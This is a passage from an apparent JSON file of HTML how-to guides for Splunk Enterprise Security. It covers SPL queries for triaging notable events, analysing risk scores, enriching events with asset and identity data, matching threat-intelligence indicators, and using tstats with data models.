class=\"guide-group-header\">Step 6: Document and Disposition</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Based on your investigation:</p>\n                        <ul>\n                            <li><strong>True Positive</strong> - Escalate to incident, assign owner, begin response</li>\n                            <li><strong>Benign True Positive</strong> - Real activity but expected (e.g., admin doing their job). Document and close</li>\n                            <li><strong>False Positive</strong> - Detection is wrong. Close with notes, consider tuning the rule</li>\n                        </ul>\n                        <p>Always add comments documenting what you found and why you made your decision.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Create saved searches for your common investigation pivots. \"Investigate User\" and \"Investigate Host\" searches with tokens make triage much faster.</p>\n                </div>\n            "
      },
      {
        "id": "es-analyze-risk",
        "title": "How to analyze a high-risk user or host",
        "description": "Investigate why an entity has elevated risk and what contributed to it.",
        "keywords": "risk RBA risk-based alerting risk_score investigate user host entity",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>An entity (user or host) has high risk in ES. You need to understand what events contributed to the risk and determine if it represents a real threat.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Find the Risk Summary</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=risk risk_object=\"jsmith\"\n| stats sum(risk_score) as total_risk,\n        dc(source) as unique_detections,\n        values(source) as detection_types,\n        earliest(_time) as first_seen,\n        latest(_time) as last_seen</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Get a high-level summary: total risk, how many different rules fired, and the time window.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Break Down by Contributing Rule</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=risk risk_object=\"jsmith\"\n| stats count, sum(risk_score) as risk_contributed by source\n| sort -risk_contributed\n| head 10</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">See which detection rules contributed the most risk. This tells you what type of suspicious behavior was detected.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">View Risk Timeline</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=risk risk_object=\"jsmith\"\n| timechart span=1h sum(risk_score) by source limit=5</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">When did risk accumulate? Look for spikes that indicate active attacks or a single risky session.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Read Individual Risk Events</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=risk risk_object=\"jsmith\"\n| sort -_time\n| table _time, source, risk_score, risk_message, threat_object\n| head 20</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">The risk_message field often explains what specifically triggered the detection. threat_object may contain IOCs.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Cross-Reference with Identity</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| inputlookup identity_lookup_expanded\n| search identity=\"jsmith\"\n| table identity, first, last, email, bunit, category, managedBy, priority, watchlist</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Who is this user? Are they privileged? Executive? On a watchlist? This context helps interpret the risk.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Interpreting Risk Patterns</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li><strong>Many low-risk events</strong> - Could be noisy detection rules; review for tuning</li>\n                            <li><strong>Few high-risk events</strong> - Investigate urgently; high-confidence detections</li>\n                            <li><strong>Multiple unrelated rules</strong> - Higher confidence; independent indicators of compromise</li>\n                            <li><strong>Single rule firing repeatedly</strong> - Could be ongoing attack or noisy rule</li>\n                            <li><strong>Risk spike then quiet</strong> - Investigate the spike window closely</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>If a user has high risk from many brute-force attempts, check if they actually got compromised: look for successful logins after the failures, especially from new locations.</p>\n                </div>\n            "
      },
      {
        "id": "es-query-notable",
        "title": "How to query and filter notable events",
        "description": "Find and filter notable events for reporting, metrics, and investigation.",
        "keywords": "notable query filter search metrics reporting SOC status urgency",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You need to query notable events for reporting, metrics, or bulk investigation. This guide shows common patterns for working with the notable index.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Basic Notable Query</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=notable earliest=-24h\n| stats count by rule_name, urgency\n| sort -count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Count notables by rule and urgency in the last 24 hours. Good for understanding alert volume.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Filter by Status</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=notable status_group=open\n| stats count by rule_name, owner\n| sort -count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">status_group simplifies filtering: \"new\", \"open\" (includes in progress), \"pending\", \"closed\".</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Filter by specific status</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=notable status=\"new\" | stats count\nindex=notable status=\"in progress\" | stats count\nindex=notable status=\"pending\" | stats count\nindex=notable status=\"resolved\" OR status=\"closed\" | stats count</code></pre>\n                        </div>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Filter by Urgency</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=notable urgency IN (\"critical\", \"high\") status_group=open\n| table _time, rule_name, urgency, src, dest, user, owner</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Focus on high and critical urgency notables that haven't been closed yet.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Filter by Security Domain</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=notable security_domain=endpoint\n| stats count by rule_name | sort -count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">security_domain values: access, endpoint, network, threat, identity, audit. Useful for domain-specific reporting.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Analyst Workload Report</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=notable earliest=-7d\n| stats count as total,\n        count(eval(status_group=\"closed\")) as closed,\n        count(eval(status_group=\"open\")) as open\n    by owner\n| eval close_rate=round(closed/total*100,1).\"%\"\n| sort -total</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">See how many notables each analyst handled and their close rate.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Notable Trend Over Time</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=notable earliest=-30d\n| bucket _time span=1d\n| stats count by _time, urgency\n| xyseries _time urgency count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Daily notable volume by urgency. Great for spotting trends or impact of new detections.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Use the `notable` macro instead of index=notable when you need field normalization and ES enrichment: <code>`notable` | search status=new</code></p>\n                </div>\n            "
      },
      {
        "id": "es-asset-identity-enrich",
        "title": "How to enrich events with asset and identity data",
        "description": "Add business context to your searches using ES Asset and Identity lookups.",
        "keywords": "asset identity lookup enrich context business priority owner category",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to add context to raw events - who is this user, what is this system, how critical is it, who owns it. ES Asset and Identity lookups provide this enrichment.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Enrich with Asset Data</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=firewall action=blocked\n| lookup asset_lookup_by_str ip as dest_ip\n    OUTPUT dns as dest_hostname, owner as dest_owner, priority as dest_priority, category as dest_category\n| where dest_priority=\"critical\"\n| table _time, src_ip, dest_ip, dest_hostname, dest_owner, dest_priority</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Add asset details to firewall events, then filter to critical assets. Now you know what was targeted.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Enrich with Identity Data</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=auth action=failure\n| lookup identity_lookup_expanded identity as user\n    OUTPUT first, last, bunit, category as user_category, managedBy\n| where user_category=\"privileged\"\n| table _time, user, first, last, bunit, managedBy, src_ip</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Add identity details to auth failures, filter to privileged users. Failed logins by admins need faster investigation.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Using ES Macros (Recommended)</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>`notable`\n| `get_asset(dest)`\n| `get_identity4events(user)`\n| table rule_name, dest, dest_priority, dest_owner, user, user_category, user_bunit</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">ES macros handle edge cases and are maintained by Splunk. Use them when possible.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Enrich Both Source and Destination</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=firewall\n| lookup asset_lookup_by_str ip as src_ip OUTPUTNEW dns as src_name, priority as src_priority\n| lookup asset_lookup_by_str ip as dest_ip OUTPUTNEW dns as dest_name, priority as dest_priority\n| search src_priority=\"critical\" OR dest_priority=\"critical\"\n| table _time, src_ip, src_name, src_priority, dest_ip, dest_name, dest_priority</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">OUTPUTNEW prevents overwriting if fields exist. Chain lookups for full context.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">View Available Asset/Identity Data</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| inputlookup asset_lookup_by_str | head 10\n| inputlookup identity_lookup_expanded | head 10</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Explore what fields are available in your asset and identity data.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Key Asset Fields</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li><code>ip</code> - IP address</li>\n                            <li><code>dns</code> - Hostname</li>\n                            <li><code>owner</code> - Responsible person/team</li>\n                            <li><code>priority</code> - critical, high, medium, low</li>\n                            <li><code>category</code> - server, workstation, network, etc.</li>\n                            <li><code>bunit</code> - Business unit</li>\n                            <li><code>pci_domain</code> - Compliance scope</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Key Identity Fields</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li><code>identity</code> - Username (may have aliases)</li>\n                            <li><code>first</code>, <code>last</code> - Full name</li>\n                            <li><code>email</code> - Email address</li>\n                            <li><code>managedBy</code> - Manager's identity</li>\n                            <li><code>bunit</code> - Business unit/department</li>\n                            <li><code>category</code> - normal, privileged, executive, service</li>\n                            <li><code>watchlist</code> - Enhanced monitoring flag</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout warning\">\n                    <div class=\"guide-callout-title\">Important</div>\n                    <p>Asset and identity data is only as good as your data sources. If lookups return null, the asset/identity isn't in the system. Treat unknown assets as potentially suspicious.</p>\n                </div>\n            "
      },
      {
        "id": "es-threat-intel-match",
        "title": "How to find threat intelligence matches",
        "description": "Query for events matching known malicious indicators (IOCs).",
        "keywords": "threat intelligence IOC indicator IP domain hash match correlation",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to find events where your network touched known malicious IPs, domains, or file hashes from threat intelligence feeds.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Check for IP Matches</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=firewall\n| lookup ip_intel ip as dest_ip OUTPUTNEW threat_key, description, threat_collection\n| where isnotnull(threat_key)\n| stats count by dest_ip, description, threat_collection\n| sort -count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Find firewall connections to IPs in threat intel. threat_collection tells you which feed matched.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Check for Domain Matches</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=proxy\n| eval domain=lower(url_domain)\n| lookup domain_intel domain OUTPUTNEW threat_key, description\n| where isnotnull(threat_key)\n| table _time, src_ip, url, domain, description</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Find proxy connections to malicious domains. Lowercase the domain first for consistent matching.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Check for File Hash Matches</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=endpoint file_hash=*\n| lookup file_intel file_hash OUTPUTNEW threat_key, description\n| where isnotnull(threat_key)\n| table _time, host, file_name, file_hash, description</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Find endpoint events with known malicious file hashes.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Browse Threat Intel Feeds</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| inputlookup ip_intel | stats count by threat_collection | sort -count\n| inputlookup domain_intel | stats dc(domain) as domains by threat_collection\n| inputlookup file_intel | stats dc(file_hash) as hashes by threat_collection</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">See what feeds you have and how much coverage each provides.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Search for a Specific IOC</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| inputlookup ip_intel | search ip=\"185.220.101.*\"\n| inputlookup domain_intel | search domain=\"*malicious.com\"\n| inputlookup file_intel | search file_hash=\"a1b2c3d4...\"</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Check if a specific indicator is in your threat intel.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Using the Threat Activity Data Model</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| tstats count from datamodel=Threat_Activity\n    by Threat_Activity.threat_match_field, Threat_Activity.threat_collection\n| sort -count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">ES automatically populates the Threat_Activity data model with matches. tstats is faster for aggregate queries.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Threat intel matches should generate risk events or notables automatically via correlation searches. If you're finding matches manually that weren't alerted, check your threat intel correlation search configuration.</p>\n                </div>\n            "
      },
      {
        "id": "es-tstats-datamodels",
        "title": "How to use tstats with ES data models",
        "description": "Write fast aggregate queries using ES accelerated data models.",
        "keywords": "tstats data model accelerated fast search authentication network endpoint",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You need to search large volumes of data quickly. ES data models pre-normalize and accelerate data, making aggregate searches orders of magnitude faster.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Basic tstats Syntax</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| tstats count from datamodel=Authentication\n    where Authentication.action=failure\n    by Authentication.user</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Count failed authentications by user. Notice: field names use DataModel.field_name format.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Authentication Data Model</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| tstats count from datamodel=Authentication\n    where Authentication.action=failure\n    by Authentication.user, Authentication.src\n| where count > 10</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Find users with more than 10 failed logins, grouped by source. Good for brute force detection.</p>\n                        <div class=\"guide-detail-label\">Key Authentication fields:</div>\n                        <ul>\n                            <li><code>action</code> - success, failure</li>\n                            <li><code>user</code> - Username</li>\n                            <li><code>src</code> - Source address</li>\n                            <li><code>dest</code> - Destination system</li>\n                            <li><code>app</code> - Application</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Network Traffic Data Model</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| tstats sum(All_Traffic.bytes) as total_bytes from datamodel=Network_Traffic\n    by All_Traffic.src_ip, All_Traffic.dest_ip\n| sort -total_bytes\n| head 20</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Top talkers by bytes transferred. Much faster than querying raw firewall logs.</p>\n                        <div class=\"guide-detail-label\">Key Network_Traffic fields:</div>\n                        <ul>\n                            <li><code>src_ip</code>, <code>dest_ip</code> - IP addresses</li>\n                            <li><code>src_port</code>, <code>dest_port</code> - Ports</li>\n                            <li><code>bytes</code>, <code>bytes_in</code>, <code>bytes_out</code></li>\n                            <li><code>action</code> - allowed, blocked</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Endpoint (Processes) Data Model</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| tstats count from datamodel=Endpoint.Processes\n    by Processes.process_name, Processes.user\n| sort -count\n| head 20</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Most common processes by user. Useful for baseline and anomaly detection.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Using tstats with timechart</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| tstats prestats=true count from datamodel=Authentication\n    by _time, Authentication.action span=1h\n| timechart span=1h count by Authentication.action</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">prestats=true is required before timechart or chart commands.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">summariesonly Option</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| tstats summariesonly=true count from datamodel=Authentication by Authentication.user</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\"><code>summariesonly=true</code> = faster, only accelerated data (may miss recent events). <code>summariesonly=false</code> (default) = complete but slower.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>When building ES dashboards, always use tstats against data models for aggregate panels. Save raw index searches for drilldowns and detailed investigation.</p>\n                </div>\n            "
      },
      {
        "id": "es-data-models-intro",
        "title": "Understanding ES Data Models",
        "description": "How data models work in ES and why they matter for your searches.",
        "keywords": "data model datamodel cim common information model authentication network endpoint es",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Why Data Models?</div>\n                    <div class=\"guide-detail-section\">\n                        <p>In standard Splunk, you search raw indexes. In ES, you search <strong>data models</strong> - pre-defined schemas that normalize data from different sources into common field names.</p>\n                        <p>This means a \"failed login\" looks the same whether it came from Windows, Linux, or your cloud provider.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Mental Shift</div>\n                    <div class=\"guide-detail-section\">\n                        <table class=\"guide-comparison-table\">\n                            <tr>\n                                <th>Standard Splunk</th>\n                                <th>Enterprise Security</th>\n                            </tr>\n                            <tr>\n                                <td><code>index=wineventlog EventCode=4625</code></td>\n                                <td><code>| from datamodel:Authentication where action=\"failure\"</code></td>\n                            </tr>\n                            <tr>\n                                <td>Know your indexes and sourcetypes</td>\n                                <td>Know your data models and CIM fields</td>\n                            </tr>\n                            <tr>\n                                <td>Field names vary by source</td>\n                                <td>Field names are normalized</td>\n                            </tr>\n                        </table>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Core ES Data Models</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li><strong>Authentication</strong> - Logins, logouts, privilege changes</li>\n                            <li><strong>Network_Traffic</strong> - Firewall, IDS/IPS, network flows</li>\n                            <li><strong>Endpoint</strong> - Process execution, file changes, services</li>\n                            <li><strong>Web</strong> - HTTP traffic, proxy logs</li>\n                            <li><strong>Malware</strong> - Antivirus, EDR detections</li>\n                            <li><strong>Intrusion_Detection</strong> - IDS alerts, threat detections</li>\n                            <li><strong>Change</strong> - System and configuration changes</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Finding Data Model Fields</div>\n                    <div class=\"guide-detail-section\">\n                        <p>To see what fields are available in a data model:</p>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| datamodel Authentication search | head 10</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Returns sample events with all normalized fields visible.</p>\n                        <p>Or check Settings  Data Models in ES to browse the schema.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Data models only contain events that match the model's constraints. If your data isn't showing up in a data model, check that the sourcetype is properly mapped and the required CIM fields are being extracted.</p>\n                </div>\n            "
      },
      {
        "id": "es-notable-events-guide",
        "title": "Working with Notable Events",
        "description": "How to investigate, update, and manage notable events in your ES workflow.",
        "keywords": "notable event alert investigation incident response workflow status owner",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">What Are Notable Events?</div>\n                    <div class=\"guide-detail-section\">\n                        <p>In standard Splunk, alerts trigger actions (email, webhook, etc.). In ES, alerts create <strong>notable events</strong> - structured incidents stored in an index that analysts can investigate, assign, and track.</p>\n                        <p>Think of notable events as your security incident queue.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Notable Event Lifecycle</div>\n                    <div class=\"guide-detail-section\">\n                        <ol>\n                            <li><strong>New</strong> - Just created, no one has looked at it</li>\n                            <li><strong>In Progress</strong> - An analyst is investigating</li>\n                            <li><strong>Pending</strong> - Waiting for external action</li>\n                            <li><strong>Resolved</strong> - Investigation complete</li>\n                            <li><strong>Closed</strong> - Final disposition recorded</li>\n                        </ol>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Searching Notable Events</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Find all notable events</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=notable</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">The notable index stores all generated notable events.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Filter by rule name</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=notable search_name=\"Access - Brute Force*\"</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\"><code>search_name</code> contains the correlation search that triggered the notable.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Find unassigned notables</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=notable status_group=\"new\" owner=\"unassigned\"</code></pre>\n                        </div>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Key Notable Event Fields</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li><code>search_name</code> - The correlation search that triggered it</li>\n                            <li><code>rule_name</code> - Display name of the alert</li>\n                            <li><code>urgency</code> - critical, high, medium, low, informational</li>\n                            <li><code>status</code> - Current workflow status</li>\n                            <li><code>owner</code> - Assigned analyst</li>\n                            <li><code>security_domain</code> - access, endpoint, network, threat, identity</li>\n                            <li><code>src</code>, <code>dest</code>, <code>user</code> - Key entities involved</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Use the Incident Review dashboard (Security Intelligence  Incident Review) for triage rather than raw searches. It provides a proper workflow interface with bulk actions, drilldowns, and history.</p>\n                </div>\n            "
      },
      {
        "id": "es-risk-based-alerting",
        "title": "Risk-Based Alerting Fundamentals",
        "description": "How RBA works and why it reduces alert fatigue in ES environments.",
        "keywords": "risk rba alert fatigue threshold score risk_score risk_object entity attribution",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Alert Fatigue Problem</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Traditional alerting: Each rule fires its own alert. 50 rules  100 events = 5,000 alerts. Most are noise.</p>\n                        <p>Risk-based alerting: Each rule adds risk points to an entity. Alert only when cumulative risk exceeds a threshold.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">How RBA Works</div>\n                    <div class=\"guide-detail-section\">\n                        <ol>\n                            <li><strong>Detection</strong> - Correlation search detects suspicious activity</li>\n                            <li><strong>Attribution</strong> - Risk is attributed to an entity (user, host, IP)</li>\n                            <li><strong>Accumulation</strong> - Risk scores stack up in the risk index</li>\n                            <li><strong>Threshold</strong> - Notable created when entity exceeds risk threshold</li>\n                        </ol>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Risk Index</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">View recent risk events</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=risk\n| table _time risk_object risk_object_type risk_score risk_message source</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Each row is a risk attribution - some activity that added risk to an entity.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Calculate total risk per entity</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=risk earliest=-24h\n| stats sum(risk_score) as total_risk values(source) as contributing_rules by risk_object\n| sort - total_risk</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Shows which entities have accumulated the most risk and what rules contributed.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Key RBA Fields</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li><code>risk_object</code> - The entity receiving risk (username, hostname, IP)</li>\n                            <li><code>risk_object_type</code> - user, system, or other</li>\n                            <li><code>risk_score</code> - Points assigned by this rule</li>\n                            <li><code>risk_message</code> - Description of the risky behavior</li>\n                            <li><code>source</code> - The rule that created this risk event</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Start with risk-only rules (no direct notable) for high-volume detections. Reserve direct notable creation for high-fidelity alerts. This gives you detection coverage without drowning in alerts.</p>\n                </div>\n            "
      },
      {
        "id": "es-tstats-conversion",
        "title": "Converting Searches to tstats",
        "description": "How to translate your standard Splunk searches to efficient tstats queries.",
        "keywords": "tstats stats performance optimization data model conversion translate",
